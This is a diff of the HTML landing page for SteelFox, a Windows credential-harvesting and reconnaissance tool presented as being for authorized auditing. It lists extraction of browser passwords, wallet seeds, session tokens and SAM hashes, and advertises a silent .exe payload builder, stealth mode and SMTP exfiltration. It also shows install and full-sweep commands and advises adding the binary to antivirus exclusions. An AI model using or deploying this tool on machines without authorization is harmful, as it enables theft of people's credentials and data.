@@ -1,600 +1,1600 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en" class="scroll-smooth">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SteelFox — Advanced Windows Credential & Reconnaissance Framework</title>
-    <meta name="description" content="SteelFox is a research-grade credential recovery and system reconnaissance framework designed for authorized security auditing on Windows systems.">
-    <link rel="icon" type="image/png" href="asset_site/favicon.png">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@100;300;400;600;800;900&family=JetBrains+Mono:wght@300;400;700&display=swap" rel="stylesheet">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>
+      SteelFox — Advanced Windows Credential & Reconnaissance Framework
+    </title>
+    <meta
+      name="description"
+      content="SteelFox is an open-source, research-grade credential recovery and system reconnaissance framework designed for authorized security auditing on Windows systems."
+    />
+    <meta
+      name="keywords"
+      content="SteelFox, credential recovery, system reconnaissance, security auditing, Windows security, open source, python, penetration testing, ethical hacking, digital forensics, DPAPI, Fox, Arthur Donck, myfox.tech"
+    />
+    <meta name="author" content="Fox (Arthur Donck)" />
+    <meta name="robots" content="index, follow" />
+
+    <link rel="canonical" href="https://steelfox.myfox.tech/" />
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://steelfox.myfox.tech/" />
+    <meta
+      property="og:title"
+      content="SteelFox — Advanced Windows Credential & Reconnaissance Framework"
+    />
+    <meta
+      property="og:description"
+      content="A ruthless, elegant credential recovery framework for Windows. 112 modules, zero noise, total visibility. Built by Fox."
+    />
+    <meta
+      property="og:image"
+      content="https://steelfox.myfox.tech/asset_site/image-steel-fox.png"
+    />
+    <meta property="og:site_name" content="SteelFox" />
+
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:url" content="https://steelfox.myfox.tech/" />
+    <meta
+      name="twitter:title"
+      content="SteelFox — Advanced Windows Credential & Reconnaissance Framework"
+    />
+    <meta
+      name="twitter:description"
+      content="A ruthless, elegant credential recovery framework for Windows. 112 modules, zero noise, total visibility. Built by Fox."
+    />
+    <meta
+      name="twitter:image"
+      content="https://steelfox.myfox.tech/asset_site/image-steel-fox.png"
+    />
+
+    <!-- Schema.org JSON-LD -->
+    <script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "SoftwareApplication",
+        "name": "SteelFox",
+        "operatingSystem": "Windows",
+        "applicationCategory": "SecurityApplication",
+        "description": "SteelFox is a research-grade credential recovery and system reconnaissance framework designed for authorized security auditing on Windows systems.",
+        "url": "https://steelfox.myfox.tech/",
+        "author": {
+          "@type": "Person",
+          "name": "Fox (Arthur Donck)",
+          "url": "https://myfox.tech/"
+        },
+        "codeRepository": "https://github.com/Tiger-Foxx/fox-steel"
+      }
+    </script>
+    <link rel="icon" type="image/png" href="asset_site/favicon.png" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Outfit:wght@100;300;400;600;800;900&family=JetBrains+Mono:wght@300;400;700&display=swap"
+      rel="stylesheet"
+    />
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
       tailwind.config = {
         theme: {
           extend: {
-            fontFamily: { sans:['Outfit','sans-serif'], mono:['JetBrains Mono','monospace'] }
-          }
-        }
-      }
+            fontFamily: {
+              sans: ["Outfit", "sans-serif"],
+              mono: ["JetBrains Mono", "monospace"],
+            },
+          },
+        },
+      };
     </script>
     <style>
-      *{box-sizing:border-box}
-      html,body{background:#000;color:#e4e4e7;overflow-x:hidden}
-      ::selection{background:#fff;color:#000}
+      * {
+        box-sizing: border-box;
+      }
+      html,
+      body {
+        background: #000;
+        color: #e4e4e7;
+        overflow-x: hidden;
+      }
+      ::selection {
+        background: #fff;
+        color: #000;
+      }
 
       /* Nav */
-      .nav-glass{background:rgba(0,0,0,.88);backdrop-filter:blur(14px);border-bottom:1px solid #1c1c1e}
+      .nav-glass {
+        background: rgba(0, 0, 0, 0.88);
+        backdrop-filter: blur(14px);
+        border-bottom: 1px solid #1c1c1e;
+      }
 
       /* Buttons */
-      .btn{display:inline-flex;align-items:center;gap:.5rem;font-family:'JetBrains Mono',monospace;font-size:.78rem;letter-spacing:.1em;text-transform:uppercase;padding:.85rem 2rem;transition:.2s;cursor:pointer;white-space:nowrap}
-      .btn-white{background:#fff;color:#000;border:1px solid #fff}.btn-white:hover{background:transparent;color:#fff}
-      .btn-outline{background:transparent;color:#a1a1aa;border:1px solid #27272a}.btn-outline:hover{color:#fff;border-color:#fff}
-      .btn-red{background:transparent;color:#ef4444;border:1px solid #ef4444}.btn-red:hover{background:#ef4444;color:#000}
+      .btn {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.5rem;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 0.78rem;
+        letter-spacing: 0.1em;
+        text-transform: uppercase;
+        padding: 0.85rem 2rem;
+        transition: 0.2s;
+        cursor: pointer;
+        white-space: nowrap;
+      }
+      .btn-white {
+        background: #fff;
+        color: #000;
+        border: 1px solid #fff;
+      }
+      .btn-white:hover {
+        background: transparent;
+        color: #fff;
+      }
+      .btn-outline {
+        background: transparent;
+        color: #a1a1aa;
+        border: 1px solid #27272a;
+      }
+      .btn-outline:hover {
+        color: #fff;
+        border-color: #fff;
+      }
+      .btn-red {
+        background: transparent;
+        color: #ef4444;
+        border: 1px solid #ef4444;
+      }
+      .btn-red:hover {
+        background: #ef4444;
+        color: #000;
+      }
 
       /* Cards */
-      .card{background:#0a0a0a;border:1px solid #1c1c1e;transition:.2s}
-      .card:hover{border-color:#3f3f46}
+      .card {
+        background: #0a0a0a;
+        border: 1px solid #1c1c1e;
+        transition: 0.2s;
+      }
+      .card:hover {
+        border-color: #3f3f46;
+      }
 
       /* Code block */
-      .codebox{background:#0c0c0c;border:1px solid #27272a;font-family:'JetBrains Mono',monospace;font-size:.78rem;line-height:1.7;color:#d4d4d8;overflow-x:auto}
-      .codebox .c{color:#52525b}
-      .codebox .k{color:#a1a1aa}
+      .codebox {
+        background: #0c0c0c;
+        border: 1px solid #27272a;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 0.78rem;
+        line-height: 1.7;
+        color: #d4d4d8;
+        overflow-x: auto;
+      }
+      .codebox .c {
+        color: #52525b;
+      }
+      .codebox .k {
+        color: #a1a1aa;
+      }
 
       /* Scrolling marquee */
-      .marquee-track{display:flex;width:max-content;animation:marquee 24s linear infinite}
-      @keyframes marquee{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
+      .marquee-track {
+        display: flex;
+        width: max-content;
+        animation: marquee 24s linear infinite;
+      }
+      @keyframes marquee {
+        0% {
+          transform: translateX(0);
+        }
+        100% {
+          transform: translateX(-50%);
+        }
+      }
 
       /* Icon brand colors */
-      .ico-color{opacity:.8;transition:.3s}
-      .ico-color:hover{opacity:1;transform:scale(1.1)}
+      .ico-color {
+        opacity: 0.8;
+        transition: 0.3s;
+      }
+      .ico-color:hover {
+        opacity: 1;
+        transform: scale(1.1);
+      }
 
       /* Sections */
-      .section-label{font-family:'JetBrains Mono',monospace;font-size:.68rem;letter-spacing:.25em;text-transform:uppercase;color:#52525b}
+      .section-label {
+        font-family: "JetBrains Mono", monospace;
+        font-size: 0.68rem;
+        letter-spacing: 0.25em;
+        text-transform: uppercase;
+        color: #52525b;
+      }
 
       /* Hover reveal on screenshots */
-      .shot-wrap{position:relative;overflow:hidden}
-      .shot-wrap img{transition:opacity .4s,transform .5s;opacity:.65}
-      .shot-wrap:hover img{opacity:1;transform:scale(1.01)}
-      .shot-cap{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,.92));padding:1.5rem;transform:translateY(4px);opacity:0;transition:.3s}
-      .shot-wrap:hover .shot-cap{opacity:1;transform:translateY(0)}
+      .shot-wrap {
+        position: relative;
+        overflow: hidden;
+      }
+      .shot-wrap img {
+        transition:
+          opacity 0.4s,
+          transform 0.5s;
+        opacity: 0.65;
+      }
+      .shot-wrap:hover img {
+        opacity: 1;
+        transform: scale(1.01);
+      }
+      .shot-cap {
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        background: linear-gradient(transparent, rgba(0, 0, 0, 0.92));
+        padding: 1.5rem;
+        transform: translateY(4px);
+        opacity: 0;
+        transition: 0.3s;
+      }
+      .shot-wrap:hover .shot-cap {
+        opacity: 1;
+        transform: translateY(0);
+      }
     </style>
-</head>
-<body class="font-sans antialiased">
+  </head>
+  <body class="font-sans antialiased">
+    <!-- ══════════════════ NAV ══════════════════ -->
+    <nav class="fixed top-0 w-full z-50 nav-glass">
+      <div
+        class="max-w-7xl mx-auto px-6 h-[64px] flex items-center justify-between"
+      >
+        <div class="flex items-center gap-3">
+          <img
+            src="asset_site/logo-steel-fox-white-1.png"
+            class="h-7"
+            alt="SteelFox"
+          />
+          <span class="font-mono text-sm font-bold tracking-widest"
+            >STEELFOX</span
+          >
+        </div>
+        <div
+          class="hidden md:flex gap-7 font-mono text-xs tracking-widest text-zinc-500"
+        >
+          <a href="#about" class="hover:text-white transition">ABOUT</a>
+          <a href="#coverage" class="hover:text-white transition">COVERAGE</a>
+          <a href="#install" class="hover:text-white transition">INSTALL</a>
+          <a href="#builder" class="hover:text-white transition">BUILDER</a>
+          <a href="#reports" class="hover:text-white transition">REPORTS</a>
+          <a href="#disclaimer" class="hover:text-red-400 transition">LEGAL</a>
+        </div>
+        <div class="flex items-center gap-3">
+          <a
+            href="https://github.com/Tiger-Foxx/fox-steel"
+            target="_blank"
+            class="btn btn-outline hidden sm:inline-flex"
+          >
+            <img
+              src="https://cdn.simpleicons.org/github/ffffff"
+              class="w-4 h-4"
+            />
+            GitHub
+          </a>
+          <a
+            href="https://github.com/Tiger-Foxx/fox-steel/releases"
+            target="_blank"
+            class="btn btn-white"
+          >
+            <svg
+              class="w-4 h-4"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              viewBox="0 0 24 24"
+            >
+              <path
+                stroke-linecap="square"
+                d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5 5 5-5M12 3v12"
+              />
+            </svg>
+            Download .exe
+          </a>
+        </div>
+      </div>
+    </nav>
 
-<!-- ══════════════════ NAV ══════════════════ -->
-<nav class="fixed top-0 w-full z-50 nav-glass">
-  <div class="max-w-7xl mx-auto px-6 h-[64px] flex items-center justify-between">
-    <div class="flex items-center gap-3">
-      <img src="asset_site/logo-steel-fox-white-1.png" class="h-7" alt="SteelFox">
-      <span class="font-mono text-sm font-bold tracking-widest">STEELFOX</span>
-    </div>
-    <div class="hidden md:flex gap-7 font-mono text-xs tracking-widest text-zinc-500">
-      <a href="#about"    class="hover:text-white transition">ABOUT</a>
-      <a href="#coverage" class="hover:text-white transition">COVERAGE</a>
-      <a href="#install"  class="hover:text-white transition">INSTALL</a>
-      <a href="#builder"  class="hover:text-white transition">BUILDER</a>
-      <a href="#reports"  class="hover:text-white transition">REPORTS</a>
-      <a href="#disclaimer" class="hover:text-red-400 transition">LEGAL</a>
-    </div>
-    <div class="flex items-center gap-3">
-      <a href="https://github.com/Tiger-Foxx/fox-steel" target="_blank" class="btn btn-outline hidden sm:inline-flex">
-        <img src="https://cdn.simpleicons.org/github/ffffff" class="w-4 h-4"> GitHub
-      </a>
-      <a href="https://github.com/Tiger-Foxx/fox-steel/releases" target="_blank" class="btn btn-white">
-        <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="square" d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5 5 5-5M12 3v12"/></svg>
-        Download .exe
-      </a>
-    </div>
-  </div>
-</nav>
-
-<!-- ══════════════════ HERO ══════════════════ -->
-<section class="min-h-screen pt-24 flex items-center relative overflow-hidden" style="background:radial-gradient(ellipse 80% 50% at 60% 60%,rgba(255,255,255,.04) 0%,transparent 70%)">
-  <!-- Subtle dot grid -->
-  <div class="absolute inset-0 opacity-20" style="background-image:radial-gradient(circle,#333 1px,transparent 1px);background-size:32px 32px"></div>
-  <div class="relative max-w-7xl mx-auto px-6 grid grid-cols-1 lg:grid-cols-2 gap-12 items-center py-20">
-    <div>
-   
-      <h1 class="text-6xl sm:text-7xl lg:text-8xl font-black uppercase tracking-tighter leading-[.85] mb-8">
-        STEEL<br><span style="-webkit-text-stroke:1px #fff;color:transparent">FOX</span>
-      </h1>
-      <p class="font-mono text-sm text-zinc-400 border-l border-zinc-700 pl-5 mb-10 max-w-lg leading-relaxed">
-        A ruthless, elegant credential recovery and system reconnaissance framework for Windows. 112 modules, zero noise, total visibility.
-      </p>
-      <div class="flex flex-wrap gap-4">
-        <a href="https://github.com/Tiger-Foxx/fox-steel/releases" target="_blank" class="btn btn-white">
-          <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="square" d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5 5 5-5M12 3v12"/></svg>
-          Download for Windows
-        </a>
-        <a href="https://github.com/Tiger-Foxx/fox-steel" target="_blank" class="btn btn-outline">
-          <img src="https://cdn.simpleicons.org/github/ffffff" class="w-4 h-4"> Source Code
-        </a>
-      </div>
-      <p class="font-mono text-[11px] text-zinc-700 mt-5">*Authorized security auditing purposes only. See Legal section.</p>
-    </div>
-    <div class="flex justify-center lg:justify-end relative">
-      <div class="absolute inset-0 blur-[90px] rounded-full" style="background:radial-gradient(ellipse,rgba(255,255,255,.06),transparent 70%)"></div>
-      <img src="asset_site/image-steel-fox.png" class="relative w-full max-w-[460px] drop-shadow-2xl hover:scale-105 transition duration-700" alt="SteelFox">
-    </div>
-  </div>
-</section>
-
-<!-- ══════════════════ MARQUEE ══════════════════ -->
-<div class="border-y border-zinc-900 bg-zinc-950 py-4 overflow-hidden">
-  <div class="marquee-track font-mono text-xs tracking-[.25em] text-zinc-600 uppercase select-none">
-    <span class="mx-8">112 Modules</span>•<span class="mx-8">DPAPI Decryption</span>•<span class="mx-8">Stealth Mode</span>•<span class="mx-8">Chromium AES-GCM</span>•<span class="mx-8">Firefox NSS Vaults</span>•<span class="mx-8">Payload Builder</span>•<span class="mx-8">SMTP Exfiltration</span>•<span class="mx-8">HTML Reports</span>•<span class="mx-8">Multi-User Scan</span>•<span class="mx-8">pip install</span>•
-    <span class="mx-8">112 Modules</span>•<span class="mx-8">DPAPI Decryption</span>•<span class="mx-8">Stealth Mode</span>•<span class="mx-8">Chromium AES-GCM</span>•<span class="mx-8">Firefox NSS Vaults</span>•<span class="mx-8">Payload Builder</span>•<span class="mx-8">SMTP Exfiltration</span>•<span class="mx-8">HTML Reports</span>•<span class="mx-8">Multi-User Scan</span>•<span class="mx-8">pip install</span>•
-  </div>
-</div>
-
-<!-- ══════════════════ ABOUT ══════════════════ -->
-<section id="about" class="py-28 border-b border-zinc-900">
-  <div class="max-w-7xl mx-auto px-6">
-    <div class="grid grid-cols-1 lg:grid-cols-2 gap-20 items-start">
-      <div>
-        <p class="section-label mb-4">What is SteelFox?</p>
-        <h2 class="text-4xl lg:text-5xl font-black uppercase tracking-tighter mb-8">Know Your Machine. Every Secret. Every Credential.</h2>
-        <div class="space-y-5 font-mono text-sm text-zinc-400 leading-relaxed">
-          <p>SteelFox is a <span class="text-white">modern, research-grade credential recovery and system reconnaissance framework</span> built in Python 3.10+ for Windows systems. It gives security professionals and researchers a structured, repeatable way to audit what credentials, tokens, and sensitive data are stored — and potentially exposed — on a Windows machine.</p>
-          <p>Think of it as an ultra-precise sweep of everything Windows keeps around that it probably shouldn't: browser passwords and cookies, saved WiFi keys, cryptocurrency wallet seeds, SSH keys, cloud CLI tokens, VPN credentials, messaging session files, and much more.</p>
-          <p>Whether you run it directly from the command line on a machine you control, or use the <span class="text-white">Payload Builder</span> to generate a silent standalone <code class="text-zinc-300">.exe</code> for remote or physical audit scenarios — SteelFox delivers clean, structured intelligence wrapped in a beautiful dark-themed HTML dashboard.</p>
-          <p>The project is <span class="text-white">100% open source</span> (LGPL-3.0) and accepts community contributions. Drop a module file in the right directory, it gets auto-discovered. No registration, no ceremony.</p>
-        </div>
-      </div>
-      <!-- Stats -->
-      <div class="grid grid-cols-2 gap-px bg-zinc-900 border border-zinc-900">
-        <div class="bg-black p-8"><p class="font-mono text-5xl font-bold text-white mb-2">112</p><p class="font-mono text-xs text-zinc-500 uppercase tracking-widest">Extraction Modules</p></div>
-        <div class="bg-black p-8"><p class="font-mono text-5xl font-bold text-white mb-2">12</p><p class="font-mono text-xs text-zinc-500 uppercase tracking-widest">Target Categories</p></div>
-        <div class="bg-black p-8"><p class="font-mono text-5xl font-bold text-white mb-2">3</p><p class="font-mono text-xs text-zinc-500 uppercase tracking-widest">Report Formats</p></div>
-        <div class="bg-black p-8"><p class="font-mono text-5xl font-bold text-white mb-2">1.0</p><p class="font-mono text-xs text-zinc-500 uppercase tracking-widest">Silent EXE payload</p></div>
-        <div class="col-span-2 bg-black p-8 border-t border-zinc-900">
-          <p class="font-mono text-xs text-zinc-500 uppercase tracking-widest mb-3">Use Cases</p>
-          <div class="grid grid-cols-2 gap-2 font-mono text-xs text-zinc-300">
-            <span>Penetration Testing</span>
-            <span>Academic Research</span>
-            <span>Internal Audits</span>
-            <span>Security Labs</span>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- ══════════════════ COVERAGE ══════════════════ -->
-<section id="coverage" class="py-28 border-b border-zinc-900 bg-zinc-950">
-  <div class="max-w-7xl mx-auto px-6">
-    <p class="section-label mb-4">Coverage</p>
-    <h2 class="text-4xl font-black uppercase tracking-tighter mb-4">What Gets Extracted</h2>
-    <p class="font-mono text-sm text-zinc-500 mb-14 max-w-2xl">SteelFox targets 12 categories with 112 distinct extraction modules running in an auto-discovered plugin architecture. Here's what each category yields.</p>
-    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-px bg-zinc-900 border border-zinc-900">
-      <!-- Category rows -->
-      <div class="card p-8 text-left">
-        <div class="flex items-center gap-3 mb-4"><img src="https://cdn.simpleicons.org/googlechrome" class="w-7 h-7 ico-color"><span class="font-bold text-lg">Browsers</span><span class="ml-auto font-mono text-xs text-zinc-600">2 modules</span></div>
-        <p class="font-mono text-xs text-zinc-500 leading-relaxed text-left">Chromium (AES-GCM + DPAPI v10/v20) passwords, cookies, autofill, credit cards, history, bookmarks. Firefox / Mozilla NSS vault decryption.</p>
-      </div>
-      <div class="card p-8 text-left">
-        <div class="flex items-center gap-3 mb-4"><img src="https://cdn.simpleicons.org/discord" class="w-7 h-7 ico-color"><span class="font-bold text-lg">Messaging</span><span class="ml-auto font-mono text-xs text-zinc-600">8 modules</span></div>
-        <p class="font-mono text-xs text-zinc-500 leading-relaxed text-left">Discord, Slack, Microsoft Teams, Signal Desktop, Skype, WhatsApp Desktop, Telegram sessions.</p>
-      </div>
-      <div class="card p-8 text-left">
-        <div class="flex items-center gap-3 mb-4"><img src="https://cdn.simpleicons.org/outlook" class="w-7 h-7 ico-color"><span class="font-bold text-lg">Mail</span><span class="ml-auto font-mono text-xs text-zinc-600">3 modules</span></div>
-        <p class="font-mono text-xs text-zinc-500 leading-relaxed text-left">Outlook, Thunderbird, Mailbird — credentials and SMTP/IMAP account configurations.</p>
-      </div>
-      <div class="card p-8 text-left">
-        <div class="flex items-center gap-3 mb-4"><img src="https://cdn.simpleicons.org/steam" class="w-7 h-7 ico-color"><span class="font-bold text-lg">Gaming & Crypto</span><span class="ml-auto font-mono text-xs text-zinc-600">15 modules</span></div>
-        <p class="font-mono text-xs text-zinc-500 leading-relaxed text-left">Steam, Epic Games, Battle.net. Exodus, Electrum, MetaMask, Atomic, Bitcoin Core, Ethereum Keystores — wallet seeds and keys.</p>
-      </div>
-      <div class="card p-8 text-left">
-        <div class="flex items-center gap-3 mb-4"><img src="https://cdn.simpleicons.org/amazonaws" class="w-7 h-7 ico-color"><span class="font-bold text-lg">Cloud</span><span class="ml-auto font-mono text-xs text-zinc-600">4 modules</span></div>
-        <p class="font-mono text-xs text-zinc-500 leading-relaxed text-left">OneDrive, Google Drive, Dropbox, MEGA — sync credentials and OAuth tokens.</p>
-      </div>
-      <div class="card p-8 text-left">
-        <div class="flex items-center gap-3 mb-4"><img src="https://cdn.simpleicons.org/docker" class="w-7 h-7 ico-color"><span class="font-bold text-lg">DevTools</span><span class="ml-auto font-mono text-xs text-zinc-600">21 modules</span></div>
-        <p class="font-mono text-xs text-zinc-500 leading-relaxed text-left">Git, SSH keys, Docker, AWS CLI, Azure CLI, GCP/gcloud, Kubernetes, GitHub CLI, Terraform, VS Code, JetBrains IDEs, Postman, ngrok, HashiCorp Vault…</p>
-      </div>
-      <div class="card p-8 text-left">
-        <div class="flex items-center gap-3 mb-4"><img src="https://cdn.simpleicons.org/mysql" class="w-7 h-7 ico-color"><span class="font-bold text-lg">Databases</span><span class="ml-auto font-mono text-xs text-zinc-600">5 modules</span></div>
-        <p class="font-mono text-xs text-zinc-500 leading-relaxed text-left">MySQL Workbench, DBeaver, HeidiSQL, pgAdmin 4, Robo 3T — stored connection profiles with credentials.</p>
-      </div>
-      <div class="card p-8 text-left">
-        <div class="flex items-center gap-3 mb-4"><img src="https://cdn.simpleicons.org/openvpn" class="w-7 h-7 ico-color"><span class="font-bold text-lg">Network / VPN</span><span class="ml-auto font-mono text-xs text-zinc-600">9 modules</span></div>
-        <p class="font-mono text-xs text-zinc-500 leading-relaxed text-left">WiFi profiles with cleartext keys, OpenVPN, NordVPN, ProtonVPN, WireGuard, Cisco AnyConnect, FortiClient, GlobalProtect, Tailscale.</p>
-      </div>
-      <div class="card p-8 text-left">
-        <div class="flex items-center gap-3 mb-4"><img src="https://cdn.simpleicons.org/windows11" class="w-7 h-7 ico-color"><span class="font-bold text-lg">Windows Internals</span><span class="ml-auto font-mono text-xs text-zinc-600">10 modules</span></div>
-        <p class="font-mono text-xs text-zinc-500 leading-relaxed text-left">Credential Manager, Vault, DPAPI blobs, SAM Hash dump, Autologon secrets, PowerShell history, Unattended configs, RDP files, Tortoise SVN.</p>
-      </div>
-      <div class="card p-8 text-left">
-        <div class="flex items-center gap-3 mb-4"><img src="https://cdn.simpleicons.org/powershell" class="w-7 h-7 ico-color"><span class="font-bold text-lg">Sysadmin Tools</span><span class="ml-auto font-mono text-xs text-zinc-600">14 modules</span></div>
-        <p class="font-mono text-xs text-zinc-500 leading-relaxed text-left">FileZilla, WinSCP, PuTTY, mRemoteNG, Rclone, VNC, Cyberduck, RDP Connection Manager, AnyDesk, TeamViewer, WSL, IIS.</p>
-      </div>
-      <div class="card p-8 text-left">
-        <div class="flex items-center gap-3 mb-4"><img src="https://cdn.simpleicons.org/keepassxc" class="w-7 h-7 ico-color"><span class="font-bold text-lg">Password Managers</span><span class="ml-auto font-mono text-xs text-zinc-600">4 modules</span></div>
-        <p class="font-mono text-xs text-zinc-500 leading-relaxed text-left">KeePass, Bitwarden, 1Password, LastPass — master vaults and local database paths.</p>
-      </div>
-      <div class="card p-8 text-left">
-        <div class="flex items-center gap-3 mb-4"><img src="https://cdn.simpleicons.org/linux" class="w-7 h-7 ico-color"><span class="font-bold text-lg">Reconnaissance</span><span class="ml-auto font-mono text-xs text-zinc-600">17 modules</span></div>
-        <p class="font-mono text-xs text-zinc-500 leading-relaxed text-left">System info, running processes, installed software, security software, USB history, clipboard, RDP history, scheduled tasks, shared folders, Hosts file…</p>
-      </div>
-    </div>
-    <!-- Tech icons strip -->
-    <div class="mt-14 border border-zinc-900 bg-zinc-950 p-8">
-      <p class="section-label mb-6 text-center">Technologies targeted (sample)</p>
-      <div class="flex flex-wrap justify-center gap-8">
-        <img src="https://cdn.simpleicons.org/windows11" class="w-9 h-9 ico-color" title="Windows">
-        <img src="https://cdn.simpleicons.org/googlechrome" class="w-9 h-9 ico-color" title="Chrome">
-        <img src="https://cdn.simpleicons.org/firefox" class="w-9 h-9 ico-color" title="Firefox">
-        <img src="https://cdn.simpleicons.org/discord" class="w-9 h-9 ico-color" title="Discord">
-        <img src="https://cdn.simpleicons.org/docker" class="w-9 h-9 ico-color" title="Docker">
-        <img src="https://cdn.simpleicons.org/steam" class="w-9 h-9 ico-color" title="Steam">
-        <img src="https://cdn.simpleicons.org/telegram" class="w-9 h-9 ico-color" title="Telegram">
-        <img src="https://cdn.simpleicons.org/bitwarden" class="w-9 h-9 ico-color" title="Bitwarden">
-        <img src="https://cdn.simpleicons.org/keepassxc" class="w-9 h-9 ico-color" title="KeePass">
-        <img src="https://cdn.simpleicons.org/amazonaws" class="w-9 h-9 ico-color" title="AWS">
-        <img src="https://cdn.simpleicons.org/github" class="w-9 h-9 ico-color" title="GitHub">
-        <img src="https://cdn.simpleicons.org/mysql" class="w-9 h-9 ico-color" title="MySQL">
-        <img src="https://cdn.simpleicons.org/openvpn" class="w-9 h-9 ico-color" title="OpenVPN">
-        <img src="https://cdn.simpleicons.org/outlook" class="w-9 h-9 ico-color" title="Outlook">
-        <img src="https://cdn.simpleicons.org/visualstudiocode" class="w-9 h-9 ico-color" title="VS Code">
-        <img src="https://cdn.simpleicons.org/bitcoin" class="w-9 h-9 ico-color" title="Bitcoin">
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- ══════════════════ INSTALLATION ══════════════════ -->
-<section id="install" class="py-28 border-b border-zinc-900">
-  <div class="max-w-7xl mx-auto px-6">
-    <p class="section-label mb-4">Installation</p>
-    <h2 class="text-4xl font-black uppercase tracking-tighter mb-4">Get Up & Running</h2>
-    <p class="font-mono text-sm text-zinc-500 mb-14 max-w-2xl">Three ways to run SteelFox on Windows. Choose the one that fits your context.</p>
-    <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-      <!-- Option 1: pip -->
-      <div class="card p-8 flex flex-col">
-        <div class="font-mono text-[10px] text-zinc-600 tracking-widest uppercase mb-3">Option 01 / Recommended</div>
-        <h3 class="text-xl font-bold mb-5">pip install</h3>
-        <div class="codebox p-5 rounded-none flex-1 text-xs">
-          <span class="c"># Clone the repo</span><br>
-          git clone https://github.com/<br>&nbsp;&nbsp;Tiger-Foxx/fox-steel.git<br>
-          cd fox-steel<br><br>
-          <span class="c"># Core install (Windows runtime)</span><br>
-          pip install .<br><br>
-          <span class="c"># With builder (generates .exe)</span><br>
-          pip install ".[builder]"<br><br>
-          <span class="c"># Everything</span><br>
-          pip install ".[all]"
-        </div>
-        <div class="mt-5 codebox p-4 text-xs">
-          <span class="c"># Run after install</span><br>
-          steelfox all -oH<br>
-          steelfox browsers<br>
-          steelfox --list-modules
-        </div>
-      </div>
-      <!-- Option 2: manual -->
-      <div class="card p-8 flex flex-col">
-        <div class="font-mono text-[10px] text-zinc-600 tracking-widest uppercase mb-3">Option 02 / Manual</div>
-        <h3 class="text-xl font-bold mb-5">requirements.txt</h3>
-        <div class="codebox p-5 flex-1 text-xs">
-          git clone https://github.com/<br>&nbsp;&nbsp;Tiger-Foxx/fox-steel.git<br>
-          cd fox-steel<br><br>
-          pip install -r requirements.txt<br><br>
-          <span class="c"># Run directly</span><br>
-          python steelfox.py --help<br>
-          python steelfox.py all -oH<br>
-          python steelfox.py browsers -q
-        </div>
-        <p class="font-mono text-xs text-zinc-600 mt-5">Core deps: pycryptodome ≥ 3.19, pyasn1 ≥ 0.5. Builder adds Pillow + PyInstaller.</p>
-      </div>
-      <!-- Option 3: exe -->
-      <div class="card p-8 flex flex-col border-white/5">
-        <div class="font-mono text-[10px] text-zinc-600 tracking-widest uppercase mb-3">Option 03 / No Python</div>
-        <h3 class="text-xl font-bold mb-5">Standalone .exe</h3>
-        <p class="font-mono text-xs text-zinc-500 mb-6 leading-relaxed">
-          No Python required. Download the pre-built binary from the Releases page and run it directly from PowerShell.
-        </p>
-        <div class="codebox p-5 text-xs mb-6">
-          <span class="c"># PowerShell</span><br>
-          .\steelfox_console.exe all -oH<br>
-          .\steelfox_console.exe browsers<br>
-          .\steelfox_console.exe --help
-        </div>
-        <div class="border border-zinc-800 bg-zinc-950 p-4 text-xs font-mono text-zinc-500 mb-auto">
-          ⚠ AV Note: Security tools may flag this binary. Add it to your AV exclusions or run in a controlled environment. This is expected behavior for credential auditing tools.
-        </div>
-        <a href="https://github.com/Tiger-Foxx/fox-steel/releases" target="_blank" class="btn btn-white mt-6 w-full justify-center">
-          <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="square" d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5 5 5-5M12 3v12"/></svg>
-          Download Latest Release
-        </a>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- ══════════════════ CLI USAGE ══════════════════ -->
-<section class="py-28 border-b border-zinc-900 bg-zinc-950">
-  <div class="max-w-7xl mx-auto px-6">
-    <p class="section-label mb-4">Command Line Interface</p>
-    <h2 class="text-4xl font-black uppercase tracking-tighter mb-14">The Terminal is Your Weapon</h2>
-    <div class="grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
-      <div>
-        <div class="shot-wrap border border-zinc-800">
-          <img src="asset_site/screen-shoot-command-line-interface.png" alt="SteelFox CLI" class="w-full block">
-          <div class="shot-cap"><p class="font-mono text-xs text-white">SteelFox banner + live progress during a full sweep.</p></div>
-        </div>
-      </div>
-      <div class="space-y-6">
